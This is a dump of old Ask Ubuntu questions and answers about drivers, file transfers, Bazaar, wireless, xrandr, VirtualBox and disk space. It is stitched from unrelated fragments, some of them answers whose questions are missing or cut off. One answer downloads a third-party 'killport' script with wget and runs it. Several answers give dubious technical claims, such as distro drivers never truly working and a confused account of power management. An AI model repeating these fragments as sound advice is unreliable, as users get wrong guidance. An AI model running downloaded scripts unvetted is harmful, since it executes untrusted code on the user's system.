it often seems, (if you are not patient) that brightness flickers (from bright to brighter, then from bright to less brighter even though you want only one thing) until you release the keys. It also doesn't show the brightness applet (with the slider), like in the other case.\nOK. That's all.

I found this in software sources\n\nWhen I enabled Nvidia binary Xorg driver, unity disappears along with the launcher and everything. I just have the wallpaper. I did manage to open the terminal and open software sources and select the nouveau display driver which fixed it.\nQuestion is how to enable NVIDIA binary Xorg driver and have everything working?\nHardware: Apple MacBook Pro 9,1 Mid 2012 15 inch non-retina. NVIDIA GeForce GT650M\nEDIT: I tried the solution here. And now, when I boot into Ubuntu, I get a blinking cursor. That's all! No tty1, nothing. help !!\nEDIT 2: I inserted the Live USB and re installed Ubuntu without formatting the partition. At least, I didn't lose my files, but all softwares are gone. And the output of lspci -vnn | grep '\\''[030[02]]' is \n\n01:00.0 VGA compatible controller [0300]: NVIDIA Corporation Device [10de:0fd5] (rev a1) (prog-if 00 [VGA controller])\nEDIT 3: So, I was checking the link which Shrinivas gave, namely this one http://www.dedoimedo.com/computers/ubuntu-quetzal-nvidia.html and it doesn't work for me. Specifically, where he says to run the command modprobe nvidia_current, I get the output FATAL: Error inserting nvidia_current (/lib/modules/3.5.0-22-generic/updates/dkms/nvidia_current.ko): Operation not permitted\nSo, what's the problem?

When I try to put them back on my notebook hdd (I open nautilus and move the files in F3-mode) I get a lot of hickups and the process can never be finished for any file. Something wrong with the external hdd?\n\nA: As we discussed in the comments, it is still possible to transfer your files to your device with the terminal (instead of the gui), even when there are spaces in the device name. You can either escape it with\n/media/Your\\ Drive   or /media/\"Your Drive\"\n\n(If you are on 12.10 the new location is /media/user/YourDrive, so please keep that in mind for the following instructions)\nThen use something like rsync or gcp, as both of these have a progress bar and a verbose setting which reports the details of the transfer so you can see if any errors are occuring. As an example, rsync is particularly useful, and the command\nrsync -avi --progress /home/mike/bin /media/MCADisc\n\nwhich will give a detailed report about what is being transferred:\nsending incremental file list\ncd+++++++++ bin/\n>f+++++++++ bin/Times\n          74 100%    0.00kB/s    0:00:00 (xfer#1, to-check=17/19)\n>f+++++++++ bin/apt_centre\n         158 100%   17.14kB/s    0:00:00 (xfer#2, to-check=16/19)\n\nsent 61751462 bytes  received 358 bytes  8233576.00 bytes/sec\ntotal size is 61742705  speedup is 1.00\n\nYou could also use gcp if your prefer, which I have discussed here:\n\n\n*\n\n*Progress and speed with 'cp'?\nBoth methods should transfer your files correctly or give you a good idea of what the issue is, as they give much more useful information than when you transfer files with the gui tools. \nIf you still cannot transfer your files correctly, then I should consider \nWilliam Bell's ideas to test the filesystem integrity on your disks.\n\nA: There could be many reasons\n\n\n*\n\n*The portable is corrupt - try running fsck or scandisk to check it\n\n*You are plugging a usb2 device into a usb1 port - use external power\n\n*Try copying from the terminal $ cp -uv /media/thedevice/* .\n\n*If the device is usb2 avoid using it on a usb3 port - I have issues before with this.\n\n", "Q: Bazaar - pull the last revision only (and not the whole branch) Shortly: How can I take the latest revision (only) from a remote bazaar repository and add it as a new revision to a local repository.\nBackground: I have a development system and a production system. On a development system there's a bazaar repository having branch with lots of development revisions. Once in a while I want to incorporate the latest developments into production system. I want to do so by some sort of \"pulling\" (development system can not connect to production for security reasons, but production can initiate connection to development).\nOn the production, I don't want the whole development revision history, only those revisions which actually go into production (normally it's the branch tip). Yet I want version control on the production system to keep track of what actually goes into production each time.\nbzr pull pulls the whole branch. bzr pull --revision=last:1 also pulls the whole branch, up to the specified revision.\nbzr merge --pull --revision=last:1 also pulls the whole branch. bzr merge --pull --revision=last:2..last:1 and bzr merge --pull --change=last:1 both pull only the new changes introduced in the latest revision, but not changes introduced in the older revisions.\nWith lightweight checkout I have no track of revisions which are pulled into production - local working tree remains part of the remote repository\nThe only way I see so far is importing the working tree using some rsync or scp and committing them to a local branch afterwards. Any better ideas ?\n\nA: To some degree, you can do this by running:\n$ bzr branch --stacked REMOTE-URL LOCAL-PATH\n\nthis will create a local branch that only has the last few revisions. It is an independent branch, so if you do a commit in the local branch, it won't automatically get pushed into the remote branch. If you try to access any data in the local branch that is not available, bzr will shell out to the remote branch to find that data.\n\nA: First of all, you can't accomplish this by only pulling the last revision IMO, because each revision stores only the differences with the previous revision. That explains why for instance bzr merge --pull --change=last:1 doesn't work.\nI would REALLY just pull the whole branch, but if you don't want this you could do something like\nbzr diff -rx -p1\n\nwhere x is the last revision you already included in production. This creates an overview of all changes between the current working directory and revision x, but without all the details of the revisions in between. The -p1 flag makes sure the output is in the patch format ( http://doc.bazaar.canonical.com/beta/en/user-reference/diff-help.html ). Then you can apply this patch on your production system.\nI think it is ugly, but it might do the job.\n\nA: If I understand correctly, you want to sync the production branch to the same state as the development branch tip, but without the revision history, right?\nYou can do that with:\nbzr merge OTHER_URL\nbzr revert --forget-merges\nbzr commit\n\nThe result is effectively as if you have cherry picked the changes of all the missing revisions and committed them all at once.\nHowever, there's a HUGE caveat here. Since the revision history is not preserved, Bazaar doesn't know that the changes you cherry picked have already been applied. The consequence is that next time you try these same steps, you will get conflicts. So I don't think this is a usable solution.\nAnother way (with a different caveat) is this:\nbzr diff --new OTHER_URL | patch -p0\n\nThis will apply the diff of the current branch and the reference branch as a patch. The caveat here is that patch cannot handle renames.\nAll in all, I think what you're trying to do is strange. You should just pull or merge and keep the history. Or, you could try to work with feature branches. The thing about feature branches is once the feature is completed, you stop working on it. In which case, you can merge the entire feature branch and forget the intermediary revisions, because you will never merge from the feature branch again, so you won't have the double-cherry-picking problem.\n", "Q: BCM4313 Wireless on Ubuntu Server 12.04 I'm trying to run an old netbook with Broadcom BCM4313 wireless as a print server with Ubuntu Server 12.04. Setting up the wireless without the GUI, however, is proving problematic. I do think however I've narrowed down the problem.\nI've tried both the wl driver (from bcmwl-kernel-source) as well as the (included) brcmsmac driver. With both of them, when I issue the command iwlist wlan0 scanning (eth1 for wl), I only see neighbouring networks- not my own.\nI believe this might be because my networks are n-only, but my neighbouring networks are mixed mode (I suspect this because the output of iwlist wlan0 scanning shows \"Bit Rates\" only as high as 54 Mb/s). \nAny ideas how to go about getting this thing to connect?\n\nA: Set your network to mix mode, should fix it up. I had the same problem.\n\nA: Disregard me, I'm stupid. The very next thing I looked up on this site claimed that it doesn't support channels > 11, and my wlan was on ch13! Changing this to 11, connection worked a charm with the wl driver, like so:\nwpa_passphrase mySSID myPSK >> /etc/wpa_supplicant.conf\niwconfig eth1 essid mySSID\nwpa_supplicant -D wext -i eth1 -c /etc/wpa_supplicant.conf\ndhclient eth1\n", "Q: I can't kill a port process I'm doing in Ubuntu 12\nalex@ubuntu:~/folder$ lsof -t -i:3000\n4469\nalex@ubuntu:~/folder$ kill 4469\nalex@ubuntu:~/folder$ lsof -t -i:3000\n4469\n\nWhat did I do wrong?\n\nA: kill -9 4469 \n\nor \n fuser -k -n tcp 3000\n\n3000 is the port number \nor \nUse killport command : \nwget https://raw.github.com/abdennour/miscs.sh/master/killport\nkillport 3000 \n\n\nA: I know this is old, but I found this useful to me as well. Combining the lsof command from your question and the kill-9 from Abdennour TOUMI's answer into a much simpler and quicker one-line command would give the following:\nkill -9 `lsof -t i:3000`\n\nInside of the two bactick (`) keys, you have the lsof -t i:3000 command from before, which gets the process on the port 3000. Then, the kill -9 command kills that process.\n\nA: Use this command. Replace 8000 with any other port that you want to free up.\nsudo fuser -k 8000/tcp\n\n\nA: Try these two commands.\n\nsudo lsof -i -P -n | grep LISTEN\n\nThis command will list down  Which process is listening on which port.

I checked Deluge's preferences and found that after the upgrade the downloads pathway went to 'juno' folder when it should be on my 'Torrent Downloads'. I had trouble resorting it back to 'Torrent Downloads' because it kept going back to 'juno' after clicking Apply or OK although after several tries it's now set to 'Torrent Downloads'.\nI checked a single torrent and found in the options that its path is towards 'media'. I'd like to think this is towards my external hard drive which I direct all my torrent downloads to. \nAll my completed downloads went back to 0%. I tried rebooting my laptop but unlike before where Deluge automatically re-checks completed files, now it's downloading like it's a newly added torrent. \nCan I get back the '100% completed' status to some of torrents again?\nETA: My torrent files are located in my hard drive but I direct my torrent downloads to my external hard drive. I didn't move my torrent files folder in my hard drive before or after my 12.10 upgrade.\n\nA: I have a dual boot system so I have NTFS partitions. This is where I keep my downloaded torrents.

I noticed it succeeds if in the file selection dialog I click the directory name only once (not changing to it by double-clicking, only selecting it by single-click).\nManually re-adding a torrent as explained above fixes the path problems.\n\nA: My experimenting found me a solution. I right clicked on a torrent then selected Remove Torrent > Remove Torrent. Then I manually add the torrent file I just deleted and Deluge would automatically re-check my completed torrent until it would seed again or if incomplete, would re-check the percentage completed and restart the download from that point on.\n\n", "Q: What Interface Toolkit is being recommended for Ubuntu on Nexus7/Mobile Devices?

The network connection works fine if I leave it set on dhcp, but I would like a static IP address for my new web server.  When I go into network manager and edit the connection for the one and only NIC I can select MANUAL from the dropdown menu but as soon as I do the Save button becomes greyed out.  Even after filling out all fields for the connection it is still grey and I am unable to save the static IP connection information.  Any thoughts would be greatly appreciated.  I'm hoping there is just some new setting that I am unaware of....\nOn another note, if I stop the network manager and go edit the interfaces file (and the appropriate hosts/routes/dns files), I do get a static ip address assigned and I can contact my server from the outside, however, the server cannot find the internet.  Can't ping even its own ip...  I can ping the loopback interface though.\nI'm really confused on this one.   Hoping someone can offer some help.\n\nA: Do not press the Add button after entering Gateway IP address. :)\nFound out this the hard way:\nYou have to press Add the first time, to start entering the IP, but when finished - just press enter.\nIf you do press Add a second time, you make a new address entry and are not allowed by the GUI to save. Select the empty second line and click the Delete button in the GUI to remove it.\nThis is done to make it possible to enter more than one IP on the interface, but it definitivly was not obvious to me because of the minimalistic IP entry box you have to scroll in..\n\nA: Did you fill in the IPv6 information? I had the same problem and was able to resolve it by setting IPv6 to 'ignore'.\nThe section will look like this in the configuration file under /etc/NetworkManager/system-connections\n[ipv6]\nmethod=ignore\n\n\nA: This problem appeared for me recently so hopefully this answer will help people who are looking for it now. \nIn Network Manager under the tab WiFi the form \"Cloned Mac Address\" is filled in with the plaintext 'permanent'.

I was using Windows 7 and had 250GB hard disk which were divided in many drives.\nI lost all the data on disk after installing Ubuntu.\nCan I get my old data back?\n\nA: Recovering after a format, since you probably selected \"remove windows and install ubuntu\", should be able with: Easeus Data Recovery Wizard\nIts possible, but you must not have written something to it:\n\nActually, to unformat a disk is a highly technical task. If you\n  accidentally format your disk, data recovery is possible. The reason\n  is that a format only reset files system, it does not erase data on\n  the disk; but remember: don't partition it again, don't format again,\n  don't write files onto it and don't install Windows on it again. In\n  this way, you are possible to unformat your data. The result of\n  unformat disk mostly depends on following factors:\n  \n  \n*\n  \n*For FAT type file systems: file fragmentation is a major factor. Fragmented files are likely to emerge corrupted, and un-fragmented\n  files will be fine. The format process destroys a number of important\n  bookkeeping structures on a FAT type partition, the FAT (File\n  Allocation Table) and the root directory. The absence of these\n  structures makes recovery complicated.\n  \n*For NTFS type file systems: fragmentation is of little consequence. The format process only re-initializes a part of the MFT and most of\n  the MFT remains intact. Using the information stored in the MFT, even\n  fragmented files can be recovered intact under the help of a unformat\n  software.\n\nI would say, give it a shot, just run a windows live cd, like Hirens ultimate boot disk.\nBTW, they had a linux version, but they dont distribute that anymore, I am sorry I have no linux way for fixing this\n", "Q: Unity menus don't display properly Posted this a while back on the Ubuntu forums, but never got a reply, and I still haven't found a way to fix it myself.\nI just upgraded from Ubuntu 12.04 to 12.10.

This one is certainly your case, you are booting from an USB disk and using very fast speed which causes system resources to collapse, and has to shutdown one, and because the USB disk is the boot disk it chooses to disconnect the Wi-Fi! Solution is to connect the USB disk to an hub of less speed, like if was connected to USB3, use an USB2 hub which causes the USB disk to work at USB2 speed, if it was using USB2 then use an USB1.1 hub...\n", "Q: Why are there two versions of boost and which does Ubuntu use?

When I run sudo lshw -c video, I still see the radeon driver.\nconfiguration: driver=radeon latency=0\n\nThanks a lot in advance!\nUPDATE:\nRunning xrandr gave me this:\nScreen 0: minimum 320 x 200, current 1024 x 768, maximum 8192 x 8192\n..\nDVI-0 connected 1024x768+0+0 (normal left inverted right x axis y axis) 0mm x 0mm\n\nSo following the guide, I typed in the following:\ncvt 1366 768 60\nxrandr --newmode \"1366x768_60.00\" 85.25  1368 1440 1576 1784  768 771 781 798 -hsync +vsync\nxrandr now gives me this line:\n1366x768_60.00 (0x178)   85.2MHz\n\nBut I'm still not able to execute the add command xrandr --add-mode DVI-0 1366x768, it just shows me the usage page for xrandr.\n\nA: If I'm correct in understanding your question: you are using the radeon driver in the xserver-xorg-video-ati package from the xorg-edgers PPA.  If this is the case, then you are still using the radeon driver (as you should be).\nYou can add a new video mode (resolution) by doing the following.  Use $ xrandr to determine the video output in use.  Then, # xrandr --addmode [OUTPUT] [MODE].  For example, I would put # xrandr --addmode LVDS1 1920x1080.  This is taken from here.\nEDIT: For the sake of completeness, a new mode needed to be created before adding the mode to the device.  The mode then needs to be switched to.  All of this is covered in the link.\n", "Q: Rotating one screen with xinerama in a multihead setup I have a dual-head setup: a \"main\" screen at 1920X1080, and a \"secondary\" screen to the right of it, rotated at 90 degrees counter-clockwise. Until Friday (26.10.2012), everything was working fine, however on that day an update has caused the rotation settings in xorg.conf to be ignored.\nSpecifically, I had used the rotation attribute (like in this question). Also, since I have Xinerama enabled, I don't have access to xrandr and the corresponding GUI settings (due to this bug, I think).\nWhat should I change in my xorg.conf to have the second screen rotated again?\nHere's my current xorg.conf (the third screen is a monitor built in into the laptop, disabled since my video card can only support 2 outputs). I haven't removed any comments to provide a possible forensic trace.\n\n# nvidia-settings: X configuration file generated by nvidia-settings\n# nvidia-settings:  version 304.37  (buildd@allspice)  Sun Sep  9 05:59:26 UTC 2012\n\n# commented out by update-manager, HAL is now used and auto-detects devices\n# Keyboard settings are now read from /etc/default/console-setup\n#Section \"InputDevice\"\n#\n#    # generated from default\n#    Identifier     \"Mouse0\"\n#    Driver         \"mouse\"\n#    Option         \"Protocol\" \"auto\"\n#    Option         \"Device\" \"/dev/psaux\"\n#    Option         \"Emulate3Buttons\" \"no\"\n#    Option         \"ZAxisMapping\" \"4 5\"\n#EndSection\n# commented out by update-manager, HAL is now used and auto-detects devices\n# Keyboard settings are now read from /etc/default/console-setup\n#Section \"InputDevice\"\n#\n#    # generated from default\n#    Identifier     \"Keyboard0\"\n#    Driver         \"kbd\"\n#EndSection\n\nSection \"ServerLayout\"\n\n# commented out by update-manager, HAL is now used and auto-detects devices\n# Keyboard settings are now read from /etc/default/console-setup\n#    InputDevice    \"Keyboard0\" \"CoreKeyboard\"\n# commented out by update-manager, HAL is now used and auto-detects devices\n# Keyboard settings are now read from /etc/default/console-setup\n#    InputDevice    \"Mouse0\" \"CorePointer\"\n# Removed Option \"Xinerama\" \"0\"\n# Removed Option \"Xinerama\" \"true\"\n# Removed Option \"Xinerama\" \"0\"\n# Removed Option \"Xinerama\" \"1\"\n# Removed Option \"Xinerama\" \"0\"\n# Removed Option \"Xinerama\" \"1\"\n# Removed Option \"Xinerama\" \"0\"\n    Identifier     \"Layout0\"\n    Screen      0  \"Screen0\" 1920 0\n    Screen      1  \"Screen1\" LeftOf \"Screen0\"\n    InputDevice    \"Keyboard0\" \"CoreKeyboard\"\n    InputDevice    \"Mouse0\" \"CorePointer\"\n    Option         \"Xinerama\" \"1\"\nEndSection\n\nSection \"Files\"\nEndSection\n\nSection \"InputDevice\"\n\n    # generated from default\n    Identifier     \"Keyboard0\"\n    Driver         \"kbd\"\nEndSection\n\nSection \"InputDevice\"\n\n    # generated from default\n    Identifier     \"Mouse0\"\n    Driver         \"mouse\"\n    Option         \"Protocol\" \"auto\"\n    Option         \"Device\" \"/dev/psaux\"\n    Option         \"Emulate3Buttons\" \"no\"\n    Option         \"ZAxisMapping\" \"4 5\"\nEndSection\n\nSection \"Monitor\"\n\n    # HorizSync source: edid, VertRefresh source: edid\n    Identifier     \"Monitor0\"\n    VendorName     \"Unknown\"\n    ModelName      \"Samsung SyncMaster\"\n    HorizSync       30.0 - 81.0\n    VertRefresh     56.0 - 75.0\n    Option         \"DPMS\"\nEndSection\n\nSection \"Monitor\"\n    Identifier     \"Monitor2\"\n    VendorName     \"Unknown\"\n    ModelName      \"Samsung SMBX2235\"\n    HorizSync       30.0 - 81.0\n    VertRefresh     56.0 - 75.0\nEndSection\n\nSection \"Monitor\"\n    Identifier     \"Monitor1\"\n    VendorName     \"Unknown\"\n    ModelName      \"Samsung SMBX2235\"\n    HorizSync       30.0 - 81.0\n    VertRefresh     56.0 - 75.0\nEndSection\n\nSection \"Device\"\n    Identifier     \"Device0\"\n    Driver         \"nvidia\"\n    VendorName     \"NVIDIA Corporation\"\n    BoardName      \"GeForce GT 330M\"\n    Option         \"RandRRotation\" \"on\"\n    BusID          \"PCI:2:0:0\"\n    Screen          0\nEndSection\n\nSection \"Device\"\n    Identifier     \"Device2\"\n    Driver         \"nvidia\"\n    VendorName     \"NVIDIA Corporation\"\n    BoardName      \"GeForce GT 330M\"\n    Option         \"RandRRotation\" \"on\"\n    BusID          \"PCI:2:0:0\"\n    Screen          2\nEndSection\n\nSection \"Device\"\n    Identifier     \"Device1\"\n    Driver         \"nvidia\"\n    VendorName     \"NVIDIA Corporation\"\n    BoardName      \"GeForce GT 330M\"\n    Option         \"RandRRotation\" \"on\"\n    BusID          \"PCI:2:0:0\"\n    Screen          1\nEndSection\n\nSection \"Screen\"\n\n# Removed Option \"TwinView\" \"1\"\n# Removed Option \"metamodes\" \"DFP-0: 1366x768_60 +277+1080, DFP-1: 1920x1080 +0+0;

Just to make sure we have everything covered, you might want to install your GPU driver and make sure they work.\nMost users would use the Additional Drivers in Settings, but given that this is all proprietary , I like to go to the source.\nNote that the drivers from \"Additional Drivers\" are neither the latest drivers, nor enhanced for performance on linux for many reasons, and while they might appear to work, that is never the case. Long story short, Just use the ones you download directly from the site.\nAMD : http://support.amd.com/us/Pages/AMDSupportHub.aspx\nThere's a box \"Top Support Articles\" you'll find the latest drivers for linux there, you'll want the drivers there and not any place else, trust me, I have a mobility 7670 myself and these are the only drivers that worked for me.\nNvidia : http://www.geforce.com/drivers\nAfter you download the file, refer to the top answer on /questions/18747/ the part that explains how to install drivers from .run files.\nEasiest way to make sure the driver is working after you reboot, search \"About\" in the lens, open it and choose Graphics, see if the driver is detected, if it says \"Unknown\" then the installation will have failed.\nAfter you have confirmed that the driver is working, if the problem still persists, then it is most likely with the kernel not containing drivers for some of your pc components, especially if you have an ivy bridge, as Intel has dedicated separate on-board power management in ivy bridge.\nIf that is the problem it will be difficult to fix, there's an easy fix but not really the best.\nSee, in Ubuntu power management is not very efficient, it always works without error just not as efficient as it could get, to spare you the details, all you should know is that Ubuntu runs things quite differently from other distros and even Windows just to ensure user's peace of mind, I'm a Slackware user myself and in Slackware power management is given directly to the login shell (almost like everything else) and not running in the kernel as a part of an init block, which could create problems, and for that Ubuntu doesn't employ these methods.\nAnyways, there's an easy fix for that, to install XFCE desktop. It has its dedicated power manager and it'll run things for you, overriding the power management in the Kernel since the login environment takes precedence.\nEasiest way is just install XFCE and all other bound packages from Synaptics package manager, it's not the best way, but given that you're still new to Ubuntu, it'll save you a lot of effort.\nYou don't have to use XFCE or anything, just the power management package being installed will get things on its own (the scripts are automatically loaded with init).\nThis works for me on my DELL Inspiron.\nThe other way to fix it would be to replace the scripts in Ubuntu in /etc and /dev with those that work roght, and load them into the kernel for power management to work, but then you'd have to compile and load and the process is quite complicated.\nComment if you have questions, and when you fix it, tell us what exactly did it for you.\n", "Q: How to disable sliding login screen in Gnome?

My installation of Kubuntu 12.04 does not switch to the default external monitor when I plug in nor does it switch back to the laptop monitor (Intel HD 3000) when the external one is plugged out. Both are recognized in the System Settings -> Display and Monitors -> Size and Orientation. I can set the settings manually, but I want it to happen automatically. The hardware key doesn't work if the machine woke up without the external monitor. Any ideas?\n\nA: I have the exact same problem and would like to know if theres a workaround for this. Its one of the reasons preventing me from switching unfortunately. I have been told that it is possible using xrandr but i am not sure how...\nEdit: \nIm actually appalled at how hard it is to get Kubuntu (or any other linux distro as far as i can tell) to just \"work\" as you would expect it to.\nThe best option i have found till now is to run the xrandr command using the --auto option at startup. This will automatically enable all available displays to their preferred resolution/rate etc\nIn Kubuntu, this can be run at startup in ~.kde/share/config/krandrrc\n[Display]\nApplyOnStartup=true\nStartupCommands=xrandr --auto\n\nThere are still a few problems however. \n\n\n*\n\n*If for example you want to enable only your external monitor if it is available and enable your laptop display if it is not available, this appears to be quite hard to do without writing some bash script to parse the output of the xrandr command.\n\n*Another problem which i really find annoying is that xrandr (or kubuntu/linux) does not adjust itself well when you remove a display on the fly. If i have my external monitor plugged into my laptop and decide to remove it while kubuntu is running, all i seem to get is error messages and i cannot seem to find a way to automatically make it switch to the laptop display (as you would naturally expect it to).\nI really really hope theres a better alternative to this setup. It must put a lot of users off to create such a complicated an elaborate setup just to get external monitors working.\nI might post this reply as a new question in the hopes that someone would be able to point out better options.\nEDIT2: I also noticed that gnome session automatically performs this switching so its deffinatly functionality that is available.\nWhy does Kubuntu not have such a standard feature?\nEDIT3: Kubuntu 13.04 actually has this automatic switching feautre. It has been implemented as part of kde 4.10. The only problem is that i find Kubuntu 13.04 really really buggy compared to 12.04\nEDIT4: Kubuntu 13.10 has been released and I can honestly say that it is a very stable version which you should change to. It contains the support for switching automatically between different display configurations as you plug in and out monitors.

From that administrator's account you added another user account, without setting a password for it. Now, when you log in as that second non-admin user, you can't install programs because it asks you for a password and you can't give it the password because you haven't set it.

(Normally, it takes 40 minutes.) Now it is impossible to use it, and all operations are very, very slow.\nI'm using VirtualBox version 4.2.4.\nAny ideas?\nWhy is it slow? And how can I make it faster?\n\nA: I don't know about the GUI settings needed to make Unity usable inside a VM, but I do know how to tune VMs under virtualbox, KVM, and others.  I've never had any luck making Unity work well in any virtual environment. Never tried too hard, preferring to use either pure WM or an LXDE-based DE.\nMore detailed settings are here: http://blog.jdpfu.com/2012/09/14/solution-for-slow-ubuntu-in-virtualbox\nSummary: \n\n\n*\n\n*Vbox defaults are not good for Ubuntu releases that like a real GPU.\n\n*On spinning HDDs, pre-allocate the entire virtual disk. On SSDs, it doesn't matter.\n\n*Allocate only the storage you need. Keep large files elsewhere, outside the vStorage.\n\n*Never allocate more CPUs or RAM than you should. 1 vCPU is probably enough.\n\n*Leave 1GB of RAM for the HostOS. Do not over commit RAM.\n\n*Use the VirtIO drivers for Storage and Networking. Modern Linux guests support this. \n\n*For Windows guests, use the SATA (storage) and Intel PRO/1000 (network) drivers. It is possible to use virtio drivers under Windows, it is just a little harder.\n\n*Enable ACPI and AHCI for all guests from 2003, WinXP and later.\n\n*Desktop VMs should get all 128MB of display vRAM\n\n*Server VMs should stay with 9MB of vRAM; don't waste it.\n\n*Avoid 2D and 3D accel settings, until you have everything else working the way you like.  Ubuntu/Unity does bad things when this is enabled. It can bring a Core i7 to the ground.\n\n\nThere are lots of GUI performance tips in the other answers. Those are probably valid too.\nThese same tips apply to KVM, VM-Player, and other virtual-hypervisors.

See Ubuntu 12.10 unable to use 3D acceleration. Fails to build DRM.\n\nA: Ubuntu 12.10 no longer includes Unity 2D, which was implemented for platforms that can't provide 3D acceleration. Instead, Ubuntu 12.10 has Unity run under LLVM, making code intended for the GPU run on the CPU. It is much slower than using the GPU.\nTo check if your Ubuntu 12.10 guest is using 3D acceleration, run this command:\n$ /usr/lib/nux/unity_support_test -p\nNot software rendered:    no\nNot blacklisted:          yes\nGLX fbconfig:             yes\nGLX texture from pixmap:  yes\nGL npot or rect textures: yes\nGL vertex program:        yes\nGL fragment program:      yes\nGL vertex buffer object:  yes\nGL framebuffer object:    yes\nGL version is 1.4+:       yes\n\nUnity 3D supported:       no\n\nAs you can see, \"Not software rendered\" and \"Unity 3D supported\" both return \"no\" in this example, which means Unity is using slow LLVMpipe.\nHow to enable 3D acceleration (VirtualBox 4.2.x only)\nThese instructions are intended for VirtualBox 4.2.4 or 4.2.6, installed from VirtualBox's website, not from Ubuntu's repo.

I don't think it's caused by the driver, but it's just a coincidence. So anyway I started researching it and I came accross one of the options in my BIOS in \"Advanced\" tab \"Primary Display\". It had two options \"SG\"(Switchable Graphics) and PEG(Peripheral Graphics). On SG I have Optimus enabled and on PEG I have only my discrete card enabled. On SG I was suffering the problem that my NVIDIA card isn't found each time, while on PEG it was found each time. So after setting Primary Display to PEG I installed again nvidia-313 package and tried PowerMizer. This time it worked. I tested with \"Amnesia: The Dark Descend\" and the game wasn't lagging anymore. After checking PowerMizer I confirmed that it was moving successfully between all 4 performance levels. There was something that I didn't like about it though. PowerMizer was preffering the loweest and highest performance levels. For example if I'm on the lowwest and started changing desktops, the desktop animations lag a little but PowerMizer statys in lowwest level. When doing the same when in highes level it doesn't go down.\nSo it looks like when Optimus is enabled PowerMizer isn't working correctly, but when it's disabled PowerMizer can use all performance levels.\n\nA: Do you have tried changing 1 to 3\nPowerMizerLevel=0x3\nor try (and erase other Option \"RegistyDwords\".... lines)\nOption  \"RegistryDwords\" \"PowerMizerEnable=0x1; PerfLevelSrc=0x3322; PowerMizerLevel=0x1; PowerMizerDefault=0x1; PowerMizerDefaultAC=0x3\"\n\n???\nTry playing with 3 or 1 or 2...

I was wondering since I am having problems with my computer's CD-ROM drive and Live-CD's, is it possible to install Ubuntu directly to the hard drive? For example, wipe the whole hard drive and burn the Ubuntu Install ISO to it, let the computer boot from the hard drive into the install interface, and then install Ubuntu on the same hard drive. Its far fetched- but is it possible? Thanks.\n\nA: I am not quite sure what is your problem. Can you boot using a live CD at all? If yes, you will discover you have the option to install Ubuntu on your hard disk from the live CD. If you have problems with the live CD and assuming your computer is new enough to boot from a USB stick, you can \"burn\" the CD image on a USB stick using a program like http://unetbootin.sourceforge.net/\nIn general, if you decide that Ubuntu is your OS choice, you should install it on the HDD. It will run much faster, not to mention that you will have much more freedom. \n\nA: If I understand correctly, you are looking for other options beyond liveCD and bootable USB (somehow putting the ISO on your hard drive, booting it and installing to spare space from there sounds quite tricky, starting with the fact that you don't want to use your CD drive or USB).\nSome alternatives are\n1) A netboot install 1, if your PC can network boot or has a functional floppy drive.\n2) transplanting the hard drive to a PC with functional CD drive or USB for the install, before moving it back again - this would require some work tweaking GRUB, most likely.\nHope this helps.\n\nA: I had a similar problem and came up with this solution, \nConnect the hard drive to a normal windows/Ubuntu machine via a USB-IDE adapter, run Unetbootin and use it to create a bootable drive on the USB mounted hard drive. \nPut the hard drive back into the old machine with no USB/CDrom drive.  \nWorks like a charm :-)\n\nA: you cant install space what your first os installed . \nyou can install on another part.\nyes . but you need to make your hdd part bootable . \nand extract your iso to hdd . \nwhen you did all of thing you need install grup for booting .grub install\nand ubuntu is ready . when opened it select use from disk and open terminal\nsudo apt-get purge ubiquity\n\n\nA: Here is how I did it:\nIf you have a computer that won't boot via USB in BIOS and the LiveCD doesn't work, download the ISO for a thing called 'PLOP Boot Manager' and burn it to a CD. Then, install the Ubuntu Install ISO image to a USB drive. Boot the computer via the PLOP CD and plug in the Ubuntu Install flash drive, then tell PLOP to boot via USB. Ubuntu then pulls up, and you can click the 'Install Ubuntu' option. Enjoy!\n\nA: The boot process for a HDD boot is very similar to booting from USB. You should be able to write the Image for USB Boot sticks to a hard drive and use it like you would use an USB stick only attacht to the ATA Bus.\nI believe the modern install CD is even an iso hybrid CD. so You can even write the iso file to the hard disk (like a partition image, starting with the first sector, overwriting the hard disks partition table).\nI'm saying the ISO might work, but if you can, use the USB image anyway, just to be sure.\n", "Q: Changing default text input on Nexus 7 Ubuntu to bluetooth keyboard I was curious if it was possible to use a Logitech bluetooth keyboard for android 4.0+ with Ubuntu on Nexus 7?\nI was able to connect the keyboard regularly with the GUI, the pin worked, so I would assume it is a matter of changing the default text input. I searched all of the settings I could find without finding any such option. \nAny help would be appreciated, if this is not possible feel free to say so and close this thread.\n\nA: Currently, bluetooth is not quite working on the image yet, so this won't be possible yet.\nHere's the bug:\n#1070770 bluetoothd dies with glibc malloc memory corruption when used with brcm_patchram\n", "Q: root and home are on separate partitions, but home still uses up space on root?

Run sudo apt-get clean to remove package files which where already installed. Apt normally keeps package files after downloading, even though they are already unzipped and installed and have nothing to do with the function of the software anymore.\nApart from that 10 Gig are a little cozy for a contemporary Ubuntu.\n\nA: Based on the output in your question, I see a change in /dev/sdb2 but not a change in /dev/sdb3. This leads me to believe that the files you deleted were on /dev/sdb2. If they were in fact under ~/ then that means, transitively, that ~/ is on /dev/sdb2. We can confirm or deny this by running the following:\nsudo mount\n/dev/root on / type ext4 (rw,noatime,user_xattr,barrier=1,data=ordered)\ntmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=18812k,mode=755)\ntmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)\ntmpfs on /tmp type tmpfs (rw,nosuid,nodev,relatime,size=37624k)\nproc on /proc type proc (rw,nosuid,nodev,noexec,relatime)\nsysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)\ntmpfs on /dev type tmpfs (rw,relatime,size=10240k,mode=755)\ntmpfs on /run/shm type tmpfs (rw,nosuid,nodev,relatime,size=37624k)\ndevpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620)\n/dev/mmcblk0p1 on /boot type vfat (rw,relatime,fmask=0022,dmask=0022,codepage=cp437,iocharset=ascii,shortname=mixed,errors=remount-ro)\n\nAnd you will be looking for a line that looks like\n/dev/sdb3 on /home type ext3 (rw,nosuid,relatime,errors=remount-ro)\n\nIf you don't see a line like that try to run this:\nls -l /home ## Do not put a trailing slash here (i.e., not \"/home/\" )\n\nIf you see something like...\nlrwxrwxrwx 1 pi pi 9 Oct 28 19:48 ./link -> ./some/other/path\n\n... then /home is still on your root partition.\n", "Q: how to improve performance of Ubuntu 12.10?

